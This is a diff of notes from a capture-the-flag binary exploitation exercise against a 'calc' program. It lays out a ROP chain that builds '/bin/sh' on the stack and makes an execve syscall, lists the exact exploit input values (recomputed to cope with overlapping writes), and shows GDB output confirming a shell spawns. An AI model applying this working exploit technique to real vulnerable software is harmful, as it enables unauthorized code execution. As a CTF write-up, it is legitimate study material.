@@ -187,12 +187,14 @@ before overwriting the intended target memory.
 Also, stack canary problem will be avoided, as a canary would be placed at %ebp-4, while the return address, and 
 rop chain will be at %ebp+4 and higher. Thus the stack canary will not be a problem
 
+During debugging use the following to get around signal: handle SIGALRM nostop noprint nopass
+
 Exploit Mitigations: ASLR, Canary, NX, Partial RELRO
 
           High
 main     ┌─────────────────┐ 
          ├─────────────────┤
-				 |  ROP CHAIN      |              <-- Overwrite!!!
+         |  ROP CHAIN      |              <-- Overwrite!!!
          ├─────────────────┤
          |  return addr    | [4 bytes]	  <-- Overwrite!!!
          ├─────────────────┤
@@ -270,14 +272,14 @@ pop edx ; pop ecx ; pop ebx ; ret          0, 0, 0x080ec100
 pop eax ; ret                              11 
 int 0x80
 
-Exploit Input
+Exploit 
 +360+134595403         Overwrite calc() return address to gadget 1 
 +361+1852400175        Write "/bin" to stack
 +362+134676906         Write return addr to gadget 2
 +363+135184640         Write string addr to stack
 +364+134853389         Write return addr to gadget 3
 +365+134595403         Write return addr to gadget 4
-+366+006845231         Write "/sh\0" to stack
++366+6845231           Write "/sh\0" to stack
 +367+134676906         Write return addr to gadget 5
 +368+135184644         Write string addr to stack
 +369+134853389         Write return addr to gadget 6
@@ -289,4 +291,44 @@ Exploit Input
 +375+11                Write 11 to stack
 +376+134519329         Write return addr to gadget 9
 
-This is the right idea, but what I found is that during debugging each new overwrite modifies the previous value
+Further analysis shows that when index 360 is written followed by write to index 361, the write to index 361 modifies the 
+value in index 360.
+Thus +360+5 will set return value = 5
++361+2 will set return value + 4 = 2, and return value = 7
++362-1 will set return value + 4 = 1, and return value + 8 = 1
+
+Translating Exploit
++360+134595403   | +360+30000000
++361+1852400175  | +361+104595403
++362+134676906   | +362+1747804772
++363+135184640   | +363-1613127866
++364+134853389   | +364-1477943226
++365+134595403   | +365-1343089837
++366+6845231     | +366-1208494434
++367+134676906   | +367-1201649203
++368+135184644   | +368-1066972297
++369+134853389   | +369-931787653 
++370+134676944   | +370-796934264
++371+0           | +371-662257320 
++372+0           | +372-662257320
++373+135184640   | +373-662257320
++374+134595403   | +374-527072680
++375+11          | +375-392477277
++376+134519329   | +376-392477266 
+                 | +377-257957937
+
+Where 0xffffcca0 is frame pointer for calc
+gef➤  x/32wx 0xffffcca0 - 0x10
+0xffffcc90:     0x00000000      0x080481b0      0x01c99038      0x0805c34b
+0xffffcca0:     0x6e69622f      0x080701aa      0x080ec100      0x0809b30d
+0xffffccb0:     0x0805c34b      0x0068732f      0x080701aa      0x080ec104
+0xffffccc0:     0x0809b30d      0x080701d0      0x00000000      0x00000000
+0xffffccd0:     0x080ec100      0x0805c34b      0x0000000b      0x08049a21
+0xffffcce0:     0x0f602031      0x7ffddbee      0x89482a01      0x00000000
+process 8834 is executing new program: /usr/bin/dash
+
+Exploit works in GDB.
+Locally: (cat exploit; cat) | ./calc
+
+FLAG{C:\Windows\System32\calc.exe}
+
